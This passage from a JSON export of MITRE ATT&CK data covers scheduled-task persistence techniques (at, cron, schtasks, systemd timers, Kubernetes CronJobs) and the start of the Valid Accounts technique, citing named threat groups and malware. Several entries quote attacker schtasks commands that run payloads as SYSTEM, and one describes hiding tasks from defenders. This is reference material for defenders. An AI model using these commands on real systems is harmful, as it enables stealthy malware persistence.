superuser is allowed to use at.\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.", "id": "T1053.002", "examples": [{"id": "G0026", "name": "APT18", "description": "APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network."}, {"id": "S0110", "name": "at", "description": "at can be used to schedule a task on a system to be executed at a specific date or time."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can set a scheduled task on the target system to execute commands remotely using at."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to schedule remote AT jobs."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network."}]}, {"name": "Cron", "description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.", "detailed_description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.\nAn adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.", "id": "T1053.003", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can install itself as a cron job."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system."}, {"id": "G1023", "name": "APT5", "description": "APT5 has made modifications to the crontab file including in /var/cron/tabs/."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux uses crontab for persistence if it does not have root privileges."}, {"id": "S0588", "name": "GoldMax", "description": "The GoldMax Linux variant has used a crontab entry with a @reboot line to gain persistence."}, {"id": "S0163", "name": "Janicab", "description": "Janicab used a cron job for persistence on Mac devices."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used crontab to download and run shell scripts every minute to ensure persistence."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use crontabs to establish persistence."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse uses a Cron job to establish persistence when infecting Linux hosts."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can use Cron to create periodic and pre-scheduled background jobs."}, {"id": "G0106", "name": "Rocke", "description": "Rocke installed a cron job that downloaded and executed files from the C2."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has installed itself via crontab."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses cron tasks to ensure persistence. "}, {"id": "S0341", "name": "Xbash", "description": "Xbash can create a cronjob for persistence if it determines it is on a Linux system."}]}, {"name": "Scheduled Task", "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet Invoke-CimMethod, which leverages WMI class PS_ScheduledTask to create a scheduled task via an XML path.", "detailed_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet Invoke-CimMethod, which leverages WMI class PS_ScheduledTask to create a scheduled task via an XML path.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys.", "id": "T1053.005", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla  has achieved persistence via scheduled tasks."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can create a scheduled task for persistence."}, {"id": "S1133", "name": "Apostle", "description": "Apostle achieves persistence by creating a scheduled task, such as MicrosoftCrashHandlerUAC."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has created a scheduled SYSTEM task that runs when a user logs in."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used named and hijacked scheduled tasks to establish persistence."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used scheduled tasks to persist on victim systems."}, {"id": "G0064", "name": "APT33", "description": "APT33 has created a scheduled task to execute a .vbe file multiple times a day."}, {"id": "G0067", "name": "APT37", "description": "APT37 has created scheduled tasks to run malicious scripts on a compromised host."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence."}, {"id": "G0087", "name": "APT39", "description": "APT39 has created scheduled tasks for persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a compromised account to create a scheduled task on a system."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can create a scheduled task to maintain persistence on system start-up."}, {"id": "S0438", "name": "Attor", "description": "Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has used scheduled tasks to maintain persistence."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit\u2019s infpub.dat file creates a scheduled task to launch a malicious executable."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use schtasks.exe to gain persistence."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can create a scheduled task for persistence."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used scheduled tasks for persistence and execution."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER persists using a scheduled task that executes every minute."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used scheduled task XML triggers."}, {"id": "S0335", "name": "Carbon", "description": "Carbon creates several tasks for later execution to continue persistence on the victim\u2019s machine."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can run on a daily basis using a scheduled task."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st and to maintain persistence."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use the Windows SilentCleanup scheduled task to enable payload execution."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has created Windows tasks to establish persistence."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used a scheduled task to launch its PowerShell loader."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has created scheduled tasks to maintain persistence on a compromised host."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses scheduled tasks typically named \"Watchmon Service\" for persistence."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors used scheduled tasks to download backdoor tools."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to register itself as a scheduled task."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has the ability to persist using scheduled tasks."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can use the schtasks utility to bypass UAC."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has attempted to use scheduled tasks for persistence in victim environments."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use a scheduled task for installation."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has created a scheduled task for persistence."}, {"id": "S1088", "name": "Disco", "description": "Disco can create a scheduled task to run every minute for persistence."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can maintain persistence via the creation of scheduled tasks within system directories such as windows\\system32\\, windows\\syswow64, winnt\\system32, and winnt\\syswow64."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to achieve persistence by adding a new task in the task scheduler to run every minute."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses remotely scheduled tasks to facilitate remote command execution on victim machines."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has maintained persistence through a scheduled task, e.g. though a .dll file in the Registry."}, {"id": "S0363", "name": "Empire", "description": "Empire has modules to interact with the Windows task scheduler."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has executed commands via scheduled tasks."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has created scheduled tasks in the C:\\Windows directory of the compromised network."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 malware has created scheduled tasks to establish persistence."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used scheduled tasks to maintain RDP backdoors."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\" "}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM established persistence for PoisonIvy by created a scheduled task."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a scheduled task."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has used scheduled tasks to maintain persistence."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to maintain persistence by creating scheduled tasks set to run every hour."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT creates a scheduled task to ensure it is re-executed everyday."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used sctasks for persistence. "}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to set persistence using the Task Scheduler."}, {"id": "S0170", "name": "Helminth", "description": "Helminth has used a scheduled task for persistence."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to use scheduled tasks for execution."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a scheduled task to establish persistence for a keylogger."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa dropped and added officeupdate.exe to scheduled tasks."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has attempted to install a scheduled task named \"Java Maintenance64\" on startup to establish persistence."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has created a scheduled task to establish persistence."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader creates scheduled tasks for persistence based on the operating system version of the victim machine."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used scheduled tasks named MSST and \\Microsoft\\Windows\\Autochk\\Scheduled to establish persistence."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has used a task XML file named mssch.xml to run an IronPython script when a user logs in or when specific system events are created."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector creates scheduled tasks to establish persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has the ability to launch scheduled tasks to establish persistence."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has downloaded additional malware with scheduled tasks."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has used scheduled tasks to add persistence."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can create scheduled tasks for persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can create a scheduled task to enable persistence mechanisms."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has created scheduled tasks to establish persistence for their tools."}, {"id": "S0409", "name": "Machete", "description": "The different components of Machete are executed by Windows Task Scheduler."}, {"id": "G0095", "name": "Machete", "description": "Machete has created scheduled tasks to maintain Machete's persistence."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used scheduled tasks to establish persistence and execution."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\"."}, {"id": "S0449", "name": "Maze", "description": "Maze has created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launch Maze at a specific time."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can use scheduled tasks for persistence."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler."}, {"id": "S0688", "name": "Meteor", "description": "Meteor execution begins from a scheduled task named Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll and it creates a separate scheduled task called mstask to run the wiper only once at 23:55:00."}, {"id": "S1015", "name": "Milan", "description": "Milan can establish persistence on a targeted host with scheduled tasks."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has created scheduled tasks to persistently run VBScripts."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used scheduled tasks for program execution during initial access to victim machines."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used scheduled tasks to establish persistence."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper creates a malicious scheduled task that launches a batch file to remove Windows Event Logs."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used schtasks.exe for lateral movement in compromised networks."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can create a scheduled task to establish persistence."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses scheduled tasks for persistence to load the final malware payload into memory."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya creates a task to reboot the system one hour after infection."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's installer can attempt to achieve persistence by creating a scheduled task."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE creates a scheduled task to run itself every three minutes."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork file stealer can run a TaskScheduler DLL to add persistence."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via a Scheduled Task/Job."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has established persistence through a scheduled task using the command \"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe\"."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER persists through a scheduled task that executes it every minute."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has been executed on a target system through a scheduled task created by Sandworm Team using Impacket."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon schedules tasks to invoke its components in order to establish persistence."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to create scheduled tasks for persistence."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT creates a scheduled task to maintain persistence on the victim\u2019s machine."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use scheduled tasks to achieve persistence."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can schedule tasks via the Windows COM API to maintain persistence."}, {"id": "G0075", "name": "Rancor", "description": "Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has created scheduled tasks for persistence."}, {"id": "S0375", "name": "Remexi", "description": "Remexi utilizes scheduled tasks as a persistence mechanism."}, {"id": "S0166", "name": "RemoteCMD", "description": "RemoteCMD can execute commands remotely by creating a new schedule task on the remote system"}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT schedules tasks to run malicious scripts at different intervals."}, {"id": "S0148", "name": "RTM", "description": "RTM tries to add a scheduled task to establish persistence."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can remotely create a scheduled task to execute itself on a system."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has created a scheduled task named \"Maintenance\" to establish persistence."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team leveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines."}, {"id": "S0111", "name": "schtasks", "description": "schtasks is used to schedule tasks on a Windows system to run at a specific date and time."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper contains modules that will use schtasks to carry out malicious operations."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has a persistence component to write a scheduled task for the payload."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has been executed via a scheduled task."}, {"id": "G0091", "name": "Silence", "description": "Silence has used scheduled tasks to stage its operation."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader launches a scheduled task."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can gain persistence through use of scheduled tasks."}, {"id": "S1140", "name": "Spica", "description": "Spica has created a scheduled task named CalendarChecker to establish persistence."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has created scheduled tasks in %appdata%\\Roaming\\Microsoft\\Templates\\."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet schedules a network job to execute two minutes after host infection."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has created scheduled tasks called MicrosoftInternetExplorerCrashRepoeterTaskMachineUA and MicrosoftEdgeCrashRepoeterTaskMachineUA, which were configured to execute CrashReporter.exe during user logon."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can create a scheduled task named RecoveryExTask to gain persistence."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used scheduled tasks to establish persistence for installed tools."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask is able to create \"hidden\" scheduled tasks for persistence."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used scheduled tasks to execute discovery commands and scripts for collection."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has used SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00 to establish persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot creates a scheduled task on the system that provides persistence."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks defined in XML files."}, {"id": "S0476", "name": "Valak", "description": "Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware."}, {"id": "S0248", "name": "yty", "description": "yty establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR \" + path_file + \"/ST 09:30\"."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has a command to create a scheduled task for persistence."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has used SchTasks for execution."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has used scheduled tasks for persistence and execution."}]}, {"name": "Systemd Timers", "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.", "detailed_description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.\nEach .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.", "id": "T1053.006", "examples": []}, {"name": "Container Orchestration Job", "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.", "detailed_description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.", "id": "T1053.007", "examples": []}]}, {"name": "Valid Accounts", "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.", "detailed_description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.", "id": "T1078", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. "}, {"id": "G1024", "name": "Akira", "description": "Akira uses valid account information to remotely access victim networks, such as VPN credentials."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors leverage legitimate credentials to log into external remote services."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used a compromised account to access an organization's VPN infrastructure."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used valid accounts for initial access and privilege escalation."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used compromised credentials to log on to other systems."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used previously compromised administrative accounts to escalate privileges."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used compromised VPN accounts."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used a valid account to maintain persistence via scheduled task."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised user credentials and used valid accounts for operations."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack used hard-coded credentials to gain access to a network share."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor."}, {"id": 